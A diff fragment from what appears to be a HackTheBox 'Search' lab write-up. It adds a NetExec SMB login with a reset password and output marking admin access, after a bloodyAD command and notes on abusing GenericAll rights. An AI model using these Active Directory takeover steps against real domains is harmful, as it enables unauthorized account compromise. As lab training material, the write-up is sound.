@@ -493,5 +493,12 @@ bloodyAD --host research.search.htb -d search.htb -u 'BIR-ADFS-GMSA$' -p ':e1e9f
 Ill change the users password using BloodyAD, other options with GenericAll include a Targeted Kerberoast or a Shadow Credentials attack, but for simplicity ill just change the users password
 
 ```python
+nxc smb research.search.htb -u 'tristan.davies' -p 'Password123!'                    
+SMB         10.129.229.57   445    RESEARCH         [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.229.57   445    RESEARCH         [+] search.htb\tristan.davies:Password123! (Pwn3d!)
+```
+The `(Pwned!)` indicator shows admin access
+
+```python
 
 ```
